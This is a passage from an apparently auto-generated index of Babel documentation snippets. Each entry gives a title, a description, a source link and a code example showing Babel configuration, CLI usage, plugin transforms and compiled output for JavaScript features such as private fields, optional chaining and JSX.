json\nCODE:\n```\n{\n  \"plugins\": [\"@babel/plugin-transform-private-property-in-object\"]\n}\n```\n\n----------------------------------------\n\nTITLE: Promise.finally() in JavaScript\nDESCRIPTION: This JavaScript code demonstrates the use of Promise.prototype.finally.  It's used as an example of a feature that might require a polyfill in older environments.  When compiled with Babel and the `useBuiltIns` option, it will automatically include the necessary core-js polyfill for Promise.prototype.finally if the target environment lacks native support.\nSOURCE: https://github.com/babel/website/blob/main/docs/usage.md#_snippet_14\n\nLANGUAGE: JavaScript\nCODE:\n```\nPromise.resolve().finally();\n```\n\n----------------------------------------\n\nTITLE: Installing the Babel Plugin\nDESCRIPTION: This shell command shows how to install the `babel-plugin-transform-inline-environment-variables` plugin using npm.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-inline-environment-variables.md#_snippet_2\n\nLANGUAGE: Shell\nCODE:\n```\nnpm install babel-plugin-transform-inline-environment-variables --save-dev\n```\n\n----------------------------------------\n\nTITLE: Transforming Code Asynchronously (Example)\nDESCRIPTION: Provides an example of using `babel.transform` to transform code, then accessing the transformed code, source map, and AST from the result object within the callback. The function takes code, options, and a callback. The callback receives an error object and a result object containing the transformed code, source map, and AST.\nSOURCE: https://github.com/babel/website/blob/main/docs/core.md#_snippet_2\n\nLANGUAGE: JavaScript\nCODE:\n```\nbabel.transform(\"code();\", options, function(err, result) {\n  result.code;\n  result.map;\n  result.ast;\n});\n```\n\n----------------------------------------\n\nTITLE: Pipeline Operator: Status Quo vs With Pipes\nDESCRIPTION: This JavaScript code demonstrates the difference between traditional JavaScript and using the pipeline operator with the 'hack' proposal and '^^' topic token.  It shows how to achieve the same result, logging environment variables and arguments, using both approaches.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-proposal-pipeline-operator.md#_snippet_1\n\nLANGUAGE: javascript\nCODE:\n```\n// Status quo\nconsole.log(\n  chalk.dim(\n    `$ ${Object.keys(envars)\n      .map(envar => `${envar}=${envars[envar]}`)\n      .join(' ')}`,\n    'node',\n    args.join(' ')\n  )\n);\n\n// With pipes\nObject.keys(envars)\n  .map(envar => `${envar}=${envars[envar]}`)\n  .join(' ')\n  |> `$ ${^^}`\n  |> chalk.dim(^^, 'node', args.join(' '))\n  |> console.log(^^);\n```\n\n----------------------------------------\n\nTITLE: Class with Private Method and Field (JavaScript)\nDESCRIPTION: This JavaScript code defines a class with a private method and field. The `privateFieldsAsProperties` assumption informs Babel that soft privacy is enough for private fields and, thus, they can be stored as public non-enumerable properties with an unique name.\nSOURCE: https://github.com/babel/website/blob/main/docs/assumptions.md#_snippet_15\n\nLANGUAGE: JavaScript\nCODE:\n```\nclass Foo {\n  #method() {}\n\n  #field = 2;\n\n  run() {\n    this.#method();\n    this.#field++;\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Using Plugin via CLI\nDESCRIPTION: Command-line usage of Babel to transform a JavaScript file using the optional chaining plugin. Requires the plugin to be installed.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-optional-chaining.md#_snippet_6\n\nLANGUAGE: Shell\nCODE:\n```\nbabel --plugins @babel/plugin-transform-optional-chaining script.js\n```\n\n----------------------------------------\n\nTITLE: classCallCheck helper with useESModules disabled - JavaScript\nDESCRIPTION: Example of the `classCallCheck` helper function generated by Babel when `useESModules` is disabled. This code snippet demonstrates the CommonJS module format.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-runtime.md#_snippet_4\n\nLANGUAGE: javascript\nCODE:\n```\nexports.__esModule = true;\n\nexports.default = function(instance, Constructor) {\n  if (!(instance instanceof Constructor)) {\n    throw new TypeError(\"Cannot call a class as a function\");\n  }\n};\n```\n\n----------------------------------------\n\nTITLE: JavaScript Class Static Block Example\nDESCRIPTION: This code demonstrates the usage of class static blocks, a stage 2 ECMAScript proposal. It shows how to perform static initializations within a class, including accessing private static fields and handling potential errors during initialization. The static block is executed when the class is defined.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2020-10-15-7.12.0.md#_snippet_2\n\nLANGUAGE: JavaScript\nCODE:\n```\nclass C {\n  static #x = 42;\n  static y;\n  static {\n    try {\n      this.y = doSomethingWith(this.#x);\n    } catch {\n      this.y = \"unknown\";\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Installing Babel core library\nDESCRIPTION: This command installs the core Babel library, @babel/core, as a development dependency. This library provides the core functionality for transforming JavaScript code.\nSOURCE: https://github.com/babel/website/blob/main/docs/usage.md#_snippet_4\n\nLANGUAGE: shell\nCODE:\n```\nnpm install --save-dev @babel/core\n```\n\n----------------------------------------\n\nTITLE: Targeting specific Chrome version in babel.config.json\nDESCRIPTION: This code snippet demonstrates how to configure babel-preset-env to target a specific Chrome browser version.  This allows Babel to only transpile the code that is not supported by the specified Chrome version, reducing the amount of transpilation required.\nSOURCE: https://github.com/babel/website/blob/main/docs/env.md#_snippet_3\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"presets\": [\n    [\n      \"env\",\n      {\n        \"targets\": {\n          \"chrome\": \"60\"\n        }\n      }\n    ]\n  ]\n}\n```\n\n----------------------------------------\n\nTITLE: Using getProgramParent in Babel Traverse\nDESCRIPTION: This code snippet demonstrates how to replace `path.scope.getFunctionParent()` with `path.scope.getProgramParent()` in Babel traverse when aiming to get the program node. It addresses a change in Babel 7 where `getFunctionParent` no longer returns the Program node.\nSOURCE: https://github.com/babel/website/blob/main/docs/v7-migration-api.md#_snippet_5\n\nLANGUAGE: diff\nCODE:\n```\n- path.scope.getFunctionParent()\n+ path.scope.getFunctionParent() || path.scope.getProgramParent()\n```\n\n----------------------------------------\n\nTITLE: Babel 6 Plugin API example\nDESCRIPTION: This is the new Babel 6 plugin API.  It demonstrates how a plugin is defined, returning an object with a `visitor` property. The `types` object provides utilities for creating and checking AST nodes. This simpler API is intended to reduce confusion and streamline plugin development.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2015-10-29-6.0.0.md#_snippet_3\n\nLANGUAGE: JavaScript\nCODE:\n```\nexport default function({ types: t }) {\n  return {\n    visitor: { … }\n  };\n}\n```\n\n----------------------------------------\n\nTITLE: Ergonomic Brand Checks for Private Fields in Babel\nDESCRIPTION: This snippet shows the ergonomic brand checks for private fields proposal, allowing to verify if an object contains a specific private field using the `in` operator. It improves the safety and readability of code dealing with private class members. Babel transformation is necessary to properly implement the check.\nSOURCE: https://github.com/babel/website/blob/main/docs/features-timeline.md#_snippet_4\n\nLANGUAGE: JavaScript\nCODE:\n```\nclass Car {\n  #plate;\n  race(other) {\n     if (#plate in other) console.log(\"Racing against another car!\");\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Use plugin via Node API\nDESCRIPTION: This code shows how to use the plugin through the Babel Node API. It transforms the input code string, using the dynamic import and SystemJS modules plugins.  It requires @babel/core to be installed.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-dynamic-import.md#_snippet_7\n\nLANGUAGE: JavaScript\nCODE:\n```\nrequire(\"@babel/core\").transformSync(\"code\", {\n  plugins: [\n    \"@babel/plugin-transform-dynamic-import\",\n    \"@babel/plugin-transform-modules-systemjs\"\n  ],\n});\n```\n\n----------------------------------------\n\nTITLE: Configuring Presets with Options\nDESCRIPTION: This snippet demonstrates how to configure a preset with options in the babel.config.json file. The preset name and options object are wrapped in an array. The options are specified as key-value pairs in the object.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugins.md#_snippet_7\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"presets\": [\n    [\n      \"env\",\n      {\n        \"loose\": true,\n        \"modules\": false\n      }\n    ]\n  ]\n}\n```\n\n----------------------------------------\n\nTITLE: Configure Babel Plugin (babel.config.json)\nDESCRIPTION: Configures the Babel plugin within a babel.config.json file.  This is the recommended method for using Babel plugins.  The plugin is specified in the \"plugins\" array.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-function-name.md#_snippet_3\n\nLANGUAGE: JSON\nCODE:\n```\n{\n  \"plugins\": [\"@babel/plugin-transform-function-name\"]\n}\n```\n\n----------------------------------------\n\nTITLE: Using Plugins in Compilation\nDESCRIPTION: Compiles `script.js` to `script-compiled.js` using the specified plugins (@babel/transform-class-properties and @babel/transform-modules-amd).  The `--plugins` option allows adding specific transformations during compilation.\nSOURCE: https://github.com/babel/website/blob/main/docs/cli.md#_snippet_15\n\nLANGUAGE: Shell\nCODE:\n```\nnpx babel script.js --out-file script-compiled.js --plugins=@babel/transform-class-properties,@babel/transform-modules-amd\n```\n\n----------------------------------------\n\nTITLE: Import core-js/stable in JavaScript\nDESCRIPTION: This JavaScript code snippet imports the core-js/stable module, which polyfills ECMAScript features to ensure compatibility with older JavaScript environments. This is the recommended approach since Babel 7.4.0, replacing @babel/polyfill. It emulates a full ES2015+ environment.\nSOURCE: https://github.com/babel/website/blob/main/docs/usage.md#_snippet_11\n\nLANGUAGE: JavaScript\nCODE:\n```\nimport \"core-js/stable\";\n```\n\n----------------------------------------\n\nTITLE: Configuring Presets in babel.config.json\nDESCRIPTION: This JSON snippet demonstrates how to specify presets within a Babel configuration file.  It shows how to include presets by name, assuming they are installed in `node_modules`.  The `presets` option takes an array of preset names.\nSOURCE: https://github.com/babel/website/blob/main/docs/presets.md#_snippet_0\n\nLANGUAGE: JSON\nCODE:\n```\n{\n  \"presets\": [\"babel-preset-myPreset\", \"@babel/preset-env\"]\n}\n```\n\n----------------------------------------\n\nTITLE: Private Destructuring Example - JavaScript\nDESCRIPTION: This code snippet demonstrates the transformation performed by the @babel/plugin-proposal-destructuring-private plugin. It shows a class with a private field being destructured within a method. The plugin transforms the private destructuring into a direct property access.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-proposal-destructuring-private.md#_snippet_0\n\nLANGUAGE: JavaScript\nCODE:\n```\nclass Foo {\n  x;\n  #y;\n  equalsTo({ x, #y: y }) {\n    return this.x === x && this.#y === y;\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Babel Configuration with JavaScript\nDESCRIPTION: This demonstrates how to use JavaScript configuration files for Babel.  It shows how to dynamically configure Babel plugins based on the environment, such as enabling certain plugins only in production.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2017-09-12-planning-for-7.0.md#_snippet_19\n\nLANGUAGE: JavaScript\nCODE:\n```\nvar env = process.env.BABEL_ENV || process.env.NODE_ENV;\nvar plugins = [];\nif (env === 'production') {\n  plugins.push.apply(plugins, [\"a-super-cool-babel-plugin\"]);\n}\nmodule.exports = { plugins };\n```\n\nLANGUAGE: JavaScript\nCODE:\n```\nvar env = process.env.BABEL_ENV || process.env.NODE_ENV;\nmodule.exports = {\n  plugins: [\n    env === 'production' && \"another-super-cool-babel-plugin\"\n  ].filter(Boolean)\n};\n```\n\n----------------------------------------\n\nTITLE: Passing arguments to Babel and script\nDESCRIPTION: Shows how to pass arguments to both Babel and the executed script, specifying that arguments for Babel come before the script filename and arguments for the script follow.\nSOURCE: https://github.com/babel/website/blob/main/docs/node.md#_snippet_8\n\nLANGUAGE: Shell\nCODE:\n```\nnpx babel-node --arg-for-babel script.js --arg-for-script.js\n```\n\n----------------------------------------\n\nTITLE: Configuration via babel.config.json - JSON\nDESCRIPTION: This JSON configuration shows how to enable the @babel/plugin-transform-duplicate-keys plugin in a babel.config.json file. The plugin transforms duplicate keys in object literals into computed properties.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-duplicate-keys.md#_snippet_2\n\nLANGUAGE: JSON\nCODE:\n```\n{\n  \"plugins\": [\"@babel/plugin-transform-duplicate-keys\"]\n}\n```\n\n----------------------------------------\n\nTITLE: Parsing with @babel/parser - Private Name Tokenization\nDESCRIPTION: This snippet illustrates how private names (`#priv`) are tokenized differently in Babel 8 compared to Babel 7. In Babel 7, a private name is tokenized as two separate tokens (`#` and `name`), while in Babel 8, it's tokenized as a single `privateName` token.  Dependencies: `@babel/parser`.\nSOURCE: https://github.com/babel/website/blob/main/docs/v8-migration-api.md#_snippet_70\n\nLANGUAGE: javascript\nCODE:\n```\nimport { parse } from \"@babel/parser\";\n\nconst { tokens } = parse(\"class C { #priv }\", { tokens: true });\ntokens.filter(t => t.start >= 10 && t.end <= 15) // get tokens for `#priv`\n// Babel 7\n// [\n//  Token (#) { value: \"#\", start: 10, end: 11 },\n//  Token (name) { value: \"priv\", start: 11, end: 15 }\n// ]\n// Babel 8\n// [\n//  Token (privateName) { value: \"priv\", start: 10, end: 15 }\n// ]\n```\n\n----------------------------------------\n\nTITLE: Transforming Code with Babel Core in JavaScript\nDESCRIPTION: This code snippet demonstrates how to use `@babel/core` to transform JavaScript code. It uses the `transform` function to process the input string \"code\" with the `@babel/preset-env` preset. The `@babel/preset-env` preset enables Babel to transform modern JavaScript syntax into code compatible with older environments. Refer to the @babel/core documentation for full API details.\nSOURCE: https://github.com/babel/website/blob/main/website/data/tools/node/usage.md#_snippet_0\n\nLANGUAGE: JavaScript\nCODE:\n```\nrequire(\"@babel/core\").transform(\"code\", {\n  presets: [\"@babel/preset-env\"],\n});\n```\n\n----------------------------------------\n\nTITLE: Classes in JavaScript\nDESCRIPTION: Illustrates the class syntax introduced in ES2015, providing a more structured way to define object-oriented patterns. The example shows class inheritance, the use of `super` to call the parent class's constructor and methods, and the definition of static methods.\nSOURCE: https://github.com/babel/website/blob/main/docs/learn.md#_snippet_1\n\nLANGUAGE: JavaScript\nCODE:\n```\nclass SkinnedMesh extends THREE.Mesh {\n  constructor(geometry, materials) {\n    super(geometry, materials);\n\n    this.idMatrix = SkinnedMesh.defaultMatrix();\n    this.bones = [];\n    this.boneMatrices = [];\n    //...\n  }\n  update(camera) {\n    //...\n    super.update();\n  }\n  static defaultMatrix() {\n    return new THREE.Matrix4();\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Use Babel plugin via CLI\nDESCRIPTION: Example of using the plugin via the Babel CLI. It shows how to pass the plugin to the `babel` command to transform a JavaScript file.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-named-capturing-groups-regex.md#_snippet_4\n\nLANGUAGE: Shell\nCODE:\n```\nbabel --plugins @babel/plugin-transform-named-capturing-groups-regex script.js\n```\n\n----------------------------------------\n\nTITLE: Transform Runtime Helper Example (Inlined)\nDESCRIPTION: Shows the code generated by Babel without the transform-runtime plugin. Notice the inlined helper function. This version shows the typical output of Babel, which inlines helper functions to avoid external dependencies.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-runtime.md#_snippet_14\n\nLANGUAGE: JavaScript\nCODE:\n```\n\"use strict\";\n\nfunction _classCallCheck(instance, Constructor) {\n  if (!(instance instanceof Constructor)) {\n    throw new TypeError(\"Cannot call a class as a function\");\n  }\n}\n\nvar Person = function Person() {\n  _classCallCheck(this, Person);\n};\n```\n\n----------------------------------------\n\nTITLE: Private Fields in in JavaScript\nDESCRIPTION: This snippet demonstrates the use of the Stage 1 proposal `#private in obj` which allows you to statically check if a given object has a specific private field without throwing an error if it doesn't exist. It provides a more robust syntax for determining if an object has a particular private field.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2020-05-25-7.10.0.md#_snippet_7\n\nLANGUAGE: JavaScript\nCODE:\n```\nclass Person {\n  #name;\n\n  hug(other) {\n    if (#name in other) console.log(`${this.#name} 🤗 ${other.#name}`);\n    else console.log(\"It's not a person!\")\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: React JSX Input Example (input.jsx)\nDESCRIPTION: Demonstrates a simple React JSX code snippet that utilizes JSX syntax for defining a profile component with an image and user information.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-react-jsx-development.md#_snippet_0\n\nLANGUAGE: js\nCODE:\n```\nconst profile = (\n  <div>\n    <img src=\"avatar.png\" className=\"profile\" />\n    <h3>{[user.firstName, user.lastName].join(\" \")}</h3>\n  </div>\n);\n```\n\n----------------------------------------\n\nTITLE: Transform Runtime Regenerator Example (After)\nDESCRIPTION: Shows the transformation of a generator function using the transform-runtime plugin.  This version imports the regenerator runtime from `@babel/runtime/regenerator`, avoiding global scope pollution. It demonstrates how the plugin enables the use of regenerator functions without polluting the global environment, by importing the necessary runtime from a module.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-runtime.md#_snippet_9\n\nLANGUAGE: JavaScript\nCODE:\n```\n\"use strict\";\n\nvar _marked = [foo].map(regeneratorRuntime.mark);\n\nfunction foo() {\n  return regeneratorRuntime.wrap(\n    function foo$(_context) {\n      while (1) {\n        switch ((_context.prev = _context.next)) {\n          case 0:\n          case \"end\":\n            return _context.stop();\n        }\n      }\n    },\n    _marked[0],\n    this\n  );\n}\n```\n\n----------------------------------------\n\nTITLE: JSON: Migrate Decorators Plugin Version\nDESCRIPTION: Demonstrates how to update the `version` option of the `@babel/plugin-proposal-decorators` plugin in your Babel configuration file from `2018-09` to `2023-11` and remove the deprecated `decoratorsBeforeExport` option.\nSOURCE: https://github.com/babel/website/blob/main/docs/v8-migration.md#_snippet_14\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"plugins\": [\n    [\"@babel/plugin-proposal-decorators\", {\n-     \"decoratorsBeforeExport\": true,\n-     \"version\": \"2018-09\",\n+     \"version\": \"2023-11\"\n    }]\n  ]\n}\n```\n\n----------------------------------------\n\nTITLE: Calling Deeply Nested Functions in JavaScript\nDESCRIPTION: Demonstrates using optional chaining to call deeply nested functions safely, preventing errors if any intermediate property is null or undefined.  The example shows how to call top-level functions directly, too.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-optional-chaining.md#_snippet_1\n\nLANGUAGE: JavaScript\nCODE:\n```\nconst obj = {\n  foo: {\n    bar: {\n      baz() {\n        return 42;\n      },\n    },\n  },\n};\n\nconst baz = obj?.foo?.bar?.baz(); // 42\n\nconst safe = obj?.qux?.baz(); // undefined\nconst safe2 = obj?.foo.bar.qux?.(); // undefined\n\nconst willThrow = obj?.foo.bar.qux(); // Error: not a function\n\n// Top function can be called directly, too.\nfunction test() {\n  return 42;\n}\ntest?.(); // 42\n\nexists?.(); // undefined\n```\n\n----------------------------------------\n\nTITLE: JavaScript Function (Types Removed)\nDESCRIPTION: This JavaScript code snippet shows the output after TypeScript types are removed by Babel with `@babel/preset-typescript`.  It defines a function `greeter` that takes a `person` object and returns a greeting string.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2018-08-27-7.0.0.md#_snippet_11\n\nLANGUAGE: JavaScript\nCODE:\n```\nfunction greeter(person) {\n  return \"Hello, \" + person.firstName + \" \" + person.lastName;\n}\n```\n\n----------------------------------------\n\nTITLE: Node.js (CommonJS) JSON Import Transformation (JavaScript)\nDESCRIPTION: This JavaScript code shows how Babel transforms the JSON module import for Node.js (CommonJS) environments. It utilizes the `fs` module to read the JSON file and `JSON.parse` to convert the string into a JavaScript object.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2024-02-28-7.24.0.md#_snippet_3\n\nLANGUAGE: javascript\nCODE:\n```\nconst myConfig = JSON.parse(\n  require(\"fs\").readFileSync(require.resolve(\"./config.json\"))\n);\n```\n\n----------------------------------------\n\nTITLE: Switching to Babel in Node.js\nDESCRIPTION: This snippet shows how to switch from `node-jsx` to `babel/register` for JSX transformation in Node.js. It involves replacing the `require` statement.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2015-02-23-babel-loves-react.md#_snippet_5\n\nLANGUAGE: JavaScript\nCODE:\n```\nrequire('babel/register');\n```\n\n----------------------------------------\n\nTITLE: JavaScript Mixin Pattern Limitation\nDESCRIPTION: Demonstrates the limitation of using the mixin pattern when extending native classes with Babel. Babel needs to statically know when you are extending a built-in class to apply the necessary wrapper.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-classes.md#_snippet_0\n\nLANGUAGE: JavaScript\nCODE:\n```\nclass Foo extends mixin(Array) {}\n\nfunction mixin(Super) {\n  return class extends Super {\n    mix() {}\n  };\n}\n```\n\n----------------------------------------\n\nTITLE: Class with declare fields\nDESCRIPTION: Illustrates the use of `declare` keyword with class fields. When `allowDeclareFields` is enabled, only fields prefixed with `declare` are removed by the transform.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-typescript.md#_snippet_6\n\nLANGUAGE: javascript\nCODE:\n```\nclass A {\n  declare foo: string; // Removed\n  bar: string; // Initialized to undefined\n}\n```\n\n----------------------------------------\n\nTITLE: Enable Automatic JSX Runtime in Babel Config (JSON)\nDESCRIPTION: This JSON configuration snippet shows how to enable the new JSX transform with the automatic runtime in Babel using the `runtime` option in `@babel/preset-react`. Setting `runtime` to `automatic` enables the new transform.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2020-03-16-7.9.0.md#_snippet_11\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"presets\": [\n    [\"@babel/preset-react\", {\n      \"runtime\": \"automatic\"\n    }]\n  ]\n}\n```\n\n----------------------------------------\n\nTITLE: Compile with Source Maps\nDESCRIPTION: Compiles `script.js` to `script-compiled.js` and generates a separate source map file.  The `--source-maps` option enables source map generation, aiding in debugging.\nSOURCE: https://github.com/babel/website/blob/main/docs/cli.md#_snippet_6\n\nLANGUAGE: Shell\nCODE:\n```\nnpx babel script.js --out-file script-compiled.js --source-maps\n```\n\n----------------------------------------\n\nTITLE: Configuration File Usage JSON\nDESCRIPTION: This JSON configuration snippet shows how to enable the plugin within a Babel configuration file (babel.config.json). It adds the `@babel/plugin-transform-flow-strip-types` to the `plugins` array, enabling the plugin for all JavaScript files processed by Babel.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-flow-strip-types.md#_snippet_3\n\nLANGUAGE: JSON\nCODE:\n```\n{\n  \"plugins\": [\"@babel/plugin-transform-flow-strip-types\"]\n}\n```\n\n----------------------------------------\n\nTITLE: ES2015 Parameters Example - Output JavaScript\nDESCRIPTION: This is the ES5 equivalent of the previous JavaScript code, generated by the @babel/plugin-transform-parameters plugin. It demonstrates how default, destructuring, and rest parameters are transformed to be compatible with older JavaScript environments. The output handles default values using ternary operators and array manipulation for rest parameters.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-parameters.md#_snippet_1\n\nLANGUAGE: JavaScript\nCODE:\n```\nfunction test() {\n  var x = arguments.length > 0 && arguments[0] !== undefined ? arguments[0] : \"hello\";\n  var _ref = arguments[1];\n  var a = _ref.a,\n    b = _ref.b;\n\n  for (\n    var _len = arguments.length,\n      args = Array(_len > 2 ? _len - 2 : 0),\n      _key = 2;\n    _key < _len;\n    _key++\n  ) {\n    args[_key - 2] = arguments[_key];\n  }\n\n  console.log(x, a, b, args);\n}\n```\n\n----------------------------------------\n\nTITLE: JavaScript Object Merging Example\nDESCRIPTION: This Javascript snippet illustrates how Babel merges objects, specifically how `sourceType` is overwritten and `assumptions` are merged when `NODE_ENV` is set to `test`. The merged object includes the overwritten `sourceType` and the combined `assumptions`, demonstrating the configuration hierarchy.\nSOURCE: https://github.com/babel/website/blob/main/docs/configuration.md#_snippet_9\n\nLANGUAGE: javascript\nCODE:\n```\n{\n  sourceType: \"module\", // sourceType: \"script\" is overwritten\n  assumptions: {\n    setClassFields: true,\n    iterableIsArray: true, // assumptions are merged by Object.assign\n  },\n}\n```\n\n----------------------------------------\n\nTITLE: Top-Level Await Usage JavaScript\nDESCRIPTION: This JavaScript code snippet demonstrates the basic syntax of top-level await. It declares a variable `val` and assigns it the result of awaiting a promise.  The variable is then exported. This plugin enables parsing this syntax.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-syntax-top-level-await.md#_snippet_0\n\nLANGUAGE: JavaScript\nCODE:\n```\nconst val = await promise;\n\nexport { val };\n```\n\n----------------------------------------\n\nTITLE: React JSX to Inline Element Transformation\nDESCRIPTION: Demonstrates how the plugin transforms a simple JSX element into a babelHelpers.jsx call. This optimization improves runtime performance by inlining the element creation.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-react-inline-elements.md#_snippet_0\n\nLANGUAGE: JavaScript\nCODE:\n```\n<Baz foo=\"bar\" key=\"1\" />\n```\n\n----------------------------------------\n\nTITLE: tsconfig.json allowImportingTsExtensions\nDESCRIPTION: Example showing how to use the allowImportingTsExtensions option.\nSOURCE: https://github.com/babel/website/blob/main/docs/preset-typescript.md#_snippet_8\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"compilerOptions\": {\n    \"lib\": [\"esnext\"],\n    \"noEmit\": true,\n    \"isolatedModules\": true,\n    \"moduleResolution\": \"nodenext\",\n    \"allowImportingTsExtensions\": true\n  }\n}\n\n```\n\n----------------------------------------\n\nTITLE: Replace import assertions with import attributes\nDESCRIPTION: This code snippet shows how to replace import assertions with import attributes, updating the syntax from `assert` to `with` in JavaScript files. This change is necessary due to the evolution of the import assertions proposal into import attributes.\nSOURCE: https://github.com/babel/website/blob/main/docs/v8-migration.md#_snippet_1\n\nLANGUAGE: javascript\nCODE:\n```\n- import value from \"module\" assert { type: \"json\" };\n+ import value from \"module\" with { type: \"json\" };\n```\n\n----------------------------------------\n\nTITLE: String Usage with Identifier Placeholders in @babel/template (JavaScript)\nDESCRIPTION: This snippet demonstrates using @babel/template with identifier placeholders (UPPER_CASE). It defines a template for a require statement and then uses it to create an AST. Requires @babel/template, @babel/generator, and @babel/types (though not explicitly imported in this snippet).\nSOURCE: https://github.com/babel/website/blob/main/docs/template.md#_snippet_2\n\nLANGUAGE: JavaScript\nCODE:\n```\nconst buildRequire = template(`\n  var IMPORT_NAME = require(SOURCE);\n`);\n\nconst ast = buildRequire({\n  IMPORT_NAME: t.identifier(\"myModule\"),\n  SOURCE: t.stringLiteral(\"my-module\"),\n});\n```\n\n----------------------------------------\n\nTITLE: Basic preset configuration change in package.json (diff)\nDESCRIPTION: This code snippet shows the difference in the `presets` array in `package.json` when migrating from `es2015` to `env`. It demonstrates how to replace the old preset with the new one for basic ES2015+ to ES5 compilation.\nSOURCE: https://github.com/babel/website/blob/main/docs/env.md#_snippet_1\n\nLANGUAGE: diff\nCODE:\n```\n{\n+  \"presets\": [\"env\"]\n-  \"presets\": [\"es2015\"]\n}\n```\n\n----------------------------------------\n\nTITLE: Creating a Custom Babel Preset in JavaScript\nDESCRIPTION: This JavaScript code demonstrates the basic structure for creating a custom Babel preset.  It exports a function that returns a configuration object containing an array of plugins.  This allows you to bundle multiple plugins into a single, reusable preset.\nSOURCE: https://github.com/babel/website/blob/main/docs/presets.md#_snippet_2\n\nLANGUAGE: JavaScript\nCODE:\n```\nmodule.exports = function() {\n  return {\n    plugins: [\"pluginA\", \"pluginB\", \"pluginC\"],\n  };\n};\n```\n\n----------------------------------------\n\nTITLE: String Usage with Syntactic Placeholders in @babel/template (JavaScript)\nDESCRIPTION: This snippet demonstrates using @babel/template with syntactic placeholders (%%placeholder%%). It defines a template for a require statement and then uses it to create an AST. The generated code is then logged to the console.  Requires @babel/template, @babel/generator, and @babel/types.\nSOURCE: https://github.com/babel/website/blob/main/docs/template.md#_snippet_1\n\nLANGUAGE: JavaScript\nCODE:\n```\nimport template from \"@babel/template\";\nimport { generate } from \"@babel/generator\";\nimport * as t from \"@babel/types\";\n\nconst buildRequire = template(`\n  var %%importName%% = require(%%source%%);\n`);\n\nconst ast = buildRequire({\n  importName: t.identifier(\"myModule\"),\n  source: t.stringLiteral(\"my-module\"),\n});\n\nconsole.log(generate(ast).code);\n```\n\n----------------------------------------\n\nTITLE: JSX Transform Output Example (JSX)\nDESCRIPTION: This JSX code snippet shows the output of the new JSX transform. It imports the `jsx` function from `react/jsx-runtime` and uses it to create the `div` element.  Note that `react` is automatically imported.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2020-03-16-7.9.0.md#_snippet_10\n\nLANGUAGE: jsx\nCODE:\n```\nimport { jsx as _jsx } from \"react/jsx-runtime\";\nfunction Foo() {\n  return _jsx(\"div\", ...);\n}\n```\n\n----------------------------------------\n\nTITLE: Babel CLI Usage (Shell)\nDESCRIPTION: Demonstrates how to use the plugin via the Babel CLI. The `--plugins` flag is used to specify the plugin to use when transforming the script.js file.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-react-constant-elements.md#_snippet_3\n\nLANGUAGE: Shell\nCODE:\n```\nbabel --plugins @babel/plugin-transform-react-constant-elements script.js\n```\n\n----------------------------------------\n\nTITLE: Use Babel Plugin via CLI\nDESCRIPTION: This command shows how to use the babel-plugin-transform-node-env-inline plugin directly from the command line when running Babel. This method does not require a configuration file.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-node-env-inline.md#_snippet_5\n\nLANGUAGE: Shell\nCODE:\n```\nbabel --plugins transform-node-env-inline script.js\n```\n\n----------------------------------------\n\nTITLE: JSON Module Transform (Browsers and Node.js ESM)\nDESCRIPTION: This code transforms the JSON module import to be compatible with both Browsers and Node.js ESM. Uses dynamic import for fs module when running in Node.js.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-json-modules.md#_snippet_4\n\nLANGUAGE: js\nCODE:\n```\nconst data = await (\n  typeof process === \"object\" && process.versions?.node\n    ? import(\"fs\").then(fs => fs.promises.readFile(new URL(import.meta.resolve(\"./data.json\")))).then(JSON.parse)\n    : fetch(import.meta.resolve(\"./data.json\")).then(r => r.json())\n);\n```\n\n----------------------------------------\n\nTITLE: Install @babel/node\nDESCRIPTION: Installs @babel/core and @babel/node as development dependencies using npm. This allows you to use ES6+ syntax in your Node.js applications without needing to pre-compile the code.\nSOURCE: https://github.com/babel/website/blob/main/docs/node.md#_snippet_0\n\nLANGUAGE: Shell\nCODE:\n```\nnpm install --save-dev @babel/core @babel/node\n```\n\n----------------------------------------\n\nTITLE: Basic Babel Configuration (JSON)\nDESCRIPTION: This JSON configuration file specifies the @babel/preset-react preset for Babel. This basic configuration uses the default settings of the preset.\nSOURCE: https://github.com/babel/website/blob/main/docs/preset-react.md#_snippet_1\n\nLANGUAGE: 